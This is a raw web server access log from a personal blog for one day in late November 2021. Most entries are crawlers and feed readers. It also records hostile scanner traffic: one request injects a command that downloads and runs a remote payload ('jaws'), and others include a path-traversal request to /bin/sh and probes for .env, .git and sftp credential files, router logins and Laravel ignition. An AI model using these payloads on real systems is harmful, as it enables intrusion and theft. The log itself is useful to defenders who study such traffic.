123.183.224.153 - - [29/Nov/2021:09:16:15 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
106.56.215.29 - - [29/Nov/2021:09:17:47 +0000] "GET / HTTP/1.1" 301 227 "http://rsaxvc.net/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
216.244.66.232 - - [29/Nov/2021:09:30:45 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
144.76.60.198 - - [29/Nov/2021:09:33:49 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
209.153.66.66 - - [29/Nov/2021:09:33:51 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
144.76.60.198 - - [29/Nov/2021:09:33:53 +0000] "GET /blog/tags/Audio.html HTTP/1.1" 301 247 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:34:14 +0000] "GET /blog/tags/Battery.html HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:34:31 +0000] "GET /blog/tags/Billings.html HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:35:06 +0000] "GET /blog/tags/Bozeman.html HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:35:32 +0000] "GET /blog/tags/Cable.html HTTP/1.1" 301 247 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:35:54 +0000] "GET /blog/tags/Cairo.html HTTP/1.1" 301 247 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:36:13 +0000] "GET /blog/tags/Cannon%20Ball.html HTTP/1.1" 301 253 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:36:54 +0000] "GET /blog/tags/Colorado.html HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:37:47 +0000] "GET /blog/tags/DeWalt.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:38:04 +0000] "GET /blog/tags/Denver.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:38:35 +0000] "GET /blog/tags/Fixed-point.html HTTP/1.1" 301 253 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:39:44 +0000] "GET /blog/tags/Idaho.html HTTP/1.1" 301 247 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:40:14 +0000] "GET /blog/tags/Kansas.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:40:30 +0000] "GET /blog/tags/Kirksville.html HTTP/1.1" 301 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:40:45 +0000] "GET /blog/tags/Kitchen.html HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
97.107.132.77 - - [29/Nov/2021:09:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
144.76.60.198 - - [29/Nov/2021:09:41:30 +0000] "GET /blog/tags/Minneapolis.html HTTP/1.1" 301 253 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:41:46 +0000] "GET /blog/tags/Minnesota.html HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
137.184.232.16 - - [29/Nov/2021:09:41:47 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 253 "http://54.38.148.198:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
144.76.60.198 - - [29/Nov/2021:09:42:01 +0000] "GET /blog/tags/Missouri.html HTTP/1.1" 301 250 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:42:24 +0000] "GET /blog/tags/NMEA.html HTTP/1.1" 301 246 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:42:42 +0000] "GET /blog/tags/NoDAP.html HTTP/1.1" 301 247 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:42:57 +0000] "GET /blog/tags/North%20Dakota.html HTTP/1.1" 301 254 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.60.198 - - [29/Nov/2021:09:44:03 +0000] "GET /blog/tags/Samsung.html HTTP/1.1" 301 249 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
114.119.142.27 - - [29/Nov/2021:09:55:32 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
207.46.13.126 - - [29/Nov/2021:10:12:13 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
18.237.122.59 - - [29/Nov/2021:10:13:42 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.211.198.235 - - [29/Nov/2021:10:14:13 +0000] "GET /favicon.ico HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.211.198.235 - - [29/Nov/2021:10:14:16 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.36.149.106 - - [29/Nov/2021:10:17:05 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.232 - - [29/Nov/2021:10:19:49 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
209.153.66.66 - - [29/Nov/2021:10:22:37 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
5.161.56.13 - - [29/Nov/2021:10:26:58 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 195.133.38.218/jaws;sh+/tmp/jaws" 400 226 "-" "-"
172.104.217.53 - - [29/Nov/2021:10:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
103.156.91.51 - - [29/Nov/2021:10:58:00 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.156.91.51 - - [29/Nov/2021:10:58:01 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.153.66.66 - - [29/Nov/2021:11:03:33 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
216.244.66.232 - - [29/Nov/2021:11:07:42 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
69.164.211.90 - - [29/Nov/2021:11:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
198.98.49.124 - - [29/Nov/2021:11:42:50 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.180.143.148 - - [29/Nov/2021:11:49:07 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
216.244.66.232 - - [29/Nov/2021:11:55:42 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
209.153.66.66 - - [29/Nov/2021:12:02:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
74.125.212.183 - - [29/Nov/2021:12:09:00 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
192.241.200.185 - - [29/Nov/2021:12:14:54 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
114.119.133.42 - - [29/Nov/2021:12:27:35 +0000] "GET /blog/tags/rsaxvc.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
97.107.132.77 - - [29/Nov/2021:12:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
34.140.248.32 - - [29/Nov/2021:12:51:16 +0000] "GET / HTTP/1.1" 301 230 "-" "python-requests/2.26.0"
209.153.66.66 - - [29/Nov/2021:12:58:35 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
114.119.135.237 - - [29/Nov/2021:13:26:29 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
178.216.26.175 - - [29/Nov/2021:13:38:06 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
23.239.11.46 - - [29/Nov/2021:13:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
99.228.74.95 - - [29/Nov/2021:13:45:10 +0000] "GET / HTTP/1.1" 301 227 "-" "Reeder/5001.29.01 CFNetwork/1325.0.1 Darwin/21.1.0"
99.228.74.95 - - [29/Nov/2021:13:45:11 +0000] "HEAD /favicon.ico HTTP/1.1" 301 - "-" "Reeder/5001.29.01 CFNetwork/1325.0.1 Darwin/21.1.0"
99.228.74.95 - - [29/Nov/2021:13:45:12 +0000] "HEAD /apple-touch-icon.png HTTP/1.1" 301 - "-" "Reeder/5001.29.01 CFNetwork/1325.0.1 Darwin/21.1.0"
99.228.74.95 - - [29/Nov/2021:13:45:12 +0000] "HEAD /apple-touch-icon-precomposed.png HTTP/1.1" 301 - "-" "Reeder/5001.29.01 CFNetwork/1325.0.1 Darwin/21.1.0"
209.153.66.66 - - [29/Nov/2021:13:49:13 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
219.94.246.47 - - [29/Nov/2021:14:00:07 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 226 "-" "curl/192.15"
185.191.171.8 - - [29/Nov/2021:14:05:35 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.45 - - [29/Nov/2021:14:05:35 +0000] "GET /blog/SCS26UC4/samsung_boot.log HTTP/1.1" 301 257 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.232 - - [29/Nov/2021:14:19:36 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
222.186.19.235 - - [29/Nov/2021:14:32:04 +0000] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0"
222.186.19.235 - - [29/Nov/2021:14:32:04 +0000] "\x16\x03\x01" 400 226 "-" "-"
222.186.19.235 - - [29/Nov/2021:14:32:04 +0000] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
222.186.19.235 - - [29/Nov/2021:14:32:06 +0000] "CONNECT fuwu.sogou.com:443 HTTP/1.1" 301 231 "-" "Go-http-client/1.1"
123.160.173.201 - - [29/Nov/2021:14:32:07 +0000] "HEAD http://110.242.68.4/ HTTP/1.1" 301 - "-" "Mozilla/5.01717655 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20"
222.186.19.235 - - [29/Nov/2021:14:32:07 +0000] "CONNECT fuwu.sogou.com:443 HTTP/1.1" 301 231 "-" "Go-http-client/1.1"
27.211.177.106 - - [29/Nov/2021:14:32:07 +0000] "CONNECT 110.242.68.4:443 HTTP/1.1" 301 229 "-" "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3"
212.83.134.143 - - [29/Nov/2021:14:40:40 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
50.116.54.8 - - [29/Nov/2021:14:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
209.153.66.66 - - [29/Nov/2021:14:41:23 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
106.56.215.64 - - [29/Nov/2021:14:49:43 +0000] "GET / HTTP/1.1" 301 227 "http://rsaxvc.net/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
78.157.40.153 - - [29/Nov/2021:15:05:20 +0000] "GET /wp-login.php HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
118.184.177.65 - - [29/Nov/2021:15:07:15 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
113.104.239.215 - - [29/Nov/2021:15:08:23 +0000] "POST /HNAP1/ HTTP/1.0" 301 236 "-" "-"
42.83.147.34 - - [29/Nov/2021:15:17:29 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
159.65.145.205 - - [29/Nov/2021:15:22:58 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
50.252.145.241 - - [29/Nov/2021:15:37:21 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
97.107.132.77 - - [29/Nov/2021:15:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
209.153.66.66 - - [29/Nov/2021:15:41:33 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
103.124.104.202 - - [29/Nov/2021:15:42:01 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
89.163.242.196 - - [29/Nov/2021:15:51:00 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.163.242.196 - - [29/Nov/2021:15:51:01 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
216.244.66.232 - - [29/Nov/2021:15:53:23 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
159.65.145.205 - - [29/Nov/2021:16:02:49 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 256 "-" "python-requests/2.18.4"
171.96.25.83 - - [29/Nov/2021:16:12:36 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
1.202.249.94 - - [29/Nov/2021:16:19:24 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
199.188.203.35 - - [29/Nov/2021:16:32:16 +0000] "GET /wp-login.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
216.244.66.232 - - [29/Nov/2021:16:39:39 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
209.153.66.66 - - [29/Nov/2021:16:40:08 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
45.79.148.82 - - [29/Nov/2021:16:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
193.169.254.179 - - [29/Nov/2021:17:10:48 +0000] "GET /.git/config HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:48 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:49 +0000] "GET /sftp-config.json HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:49 +0000] "GET /.ftpconfig HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:49 +0000] "GET /.remote-sync.json HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:49 +0000] "GET /.vscode/ftp-sync.json HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:49 +0000] "GET /.vscode/sftp.json HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:50 +0000] "GET /deployment-config.json HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
193.169.254.179 - - [29/Nov/2021:17:10:50 +0000] "GET /ftpsync.settings HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
209.97.149.220 - - [29/Nov/2021:17:15:29 +0000] "HEAD / HTTP/1.1" 301 - "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
151.44.21.31 - - [29/Nov/2021:17:21:58 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
151.44.21.31 - - [29/Nov/2021:17:22:50 +0000] "-" 408 - "-" "-"
209.153.66.66 - - [29/Nov/2021:17:27:01 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
23.239.11.46 - - [29/Nov/2021:17:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [29/Nov/2021:18:06:59 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
209.153.66.66 - - [29/Nov/2021:18:11:05 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
3.9.176.9 - - [29/Nov/2021:18:13:30 +0000] "GET / HTTP/1.0" 301 227 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
3.9.176.9 - - [29/Nov/2021:18:16:53 +0000] "GET / HTTP/1.0" 301 227 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
34.220.66.18 - - [29/Nov/2021:18:18:03 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.213.226.228 - - [29/Nov/2021:18:18:32 +0000] "GET /favicon.ico HTTP/1.1" 301 238 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
34.213.226.228 - - [29/Nov/2021:18:18:35 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
3.9.176.9 - - [29/Nov/2021:18:19:52 +0000] "GET / HTTP/1.1" 301 230 "-" "python-httpx/0.20.0"
91.241.19.243 - - [29/Nov/2021:18:20:02 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
192.241.196.29 - - [29/Nov/2021:18:25:07 +0000] "GET /portal/redlion HTTP/1.1" 301 244 "-" "Mozilla/5.0 zgrab/0.x"
123.183.224.160 - - [29/Nov/2021:18:25:19 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.160 - - [29/Nov/2021:18:25:21 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.160 - - [29/Nov/2021:18:25:23 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
49.7.21.64 - - [29/Nov/2021:18:25:23 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
49.7.21.64 - - [29/Nov/2021:18:25:25 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
49.7.21.64 - - [29/Nov/2021:18:25:27 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
118.184.177.74 - - [29/Nov/2021:18:31:57 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
123.183.224.160 - - [29/Nov/2021:18:33:23 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.160 - - [29/Nov/2021:18:33:25 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.160 - - [29/Nov/2021:18:33:26 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.152 - - [29/Nov/2021:18:33:28 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.152 - - [29/Nov/2021:18:33:30 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.152 - - [29/Nov/2021:18:33:32 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
69.164.211.90 - - [29/Nov/2021:18:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
137.184.232.16 - - [29/Nov/2021:18:45:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 253 "http://54.38.148.198:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
